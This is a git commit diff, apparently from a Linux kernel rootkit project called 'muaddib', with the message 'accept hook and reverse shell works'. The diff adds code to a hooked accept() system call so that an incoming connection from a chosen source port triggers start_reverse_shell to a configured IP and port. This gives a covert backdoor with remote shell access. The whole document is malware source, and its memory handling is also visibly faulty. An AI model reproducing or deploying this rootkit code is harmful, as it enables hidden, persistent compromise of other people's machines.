5deec7ea1ad1d3ff20df541612a164d59c78a1e6
Nerelod <dapperfellowdaniel@gmail.com>
2022-02-11 23:24:30 -0500

    accept hook and reverse shell works

--- accept_hook.c
+++ accept_hook.c
@@ -9,15 +9,23 @@ static asmlinkage long (*og_accept)(const struct pt_regs *);
 
 asmlinkage int muaddib_accept(const struct pt_regs *regs){
 
-    //struct sockaddr_in __user* sock_in;//  = (struct sockaddr_in *)regs->si;
-    //copy_from_user(sock_in, (struct sockaddr_in *)regs->si, sizeof(struct sockaddr_in));
+    struct sockaddr_in __user* sock_in = (struct sockaddr_in *)regs->si;
+    struct sockaddr_in *sock_in_kernel = NULL;
+    int ret = og_accept(regs);
+    sock_in_kernel = kzalloc(ret, GFP_KERNEL);
+    long error = copy_from_user(sock_in_kernel, sock_in, ret);
 
-    //if (ntohs(sock_in->sin_port) == SRCPORT) {
-        //printk("Port matches!");
-    //}
+    if(error){
+        kfree(sock_in_kernel);
+        return ret;
+    }
+
+    if (ntohs(sock_in_kernel->sin_port) == SRCPORT) {
+        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
+    }
 
     printk("accept hooked :)");
-    return og_accept(regs);
+    return ret;
 
 }
 #else
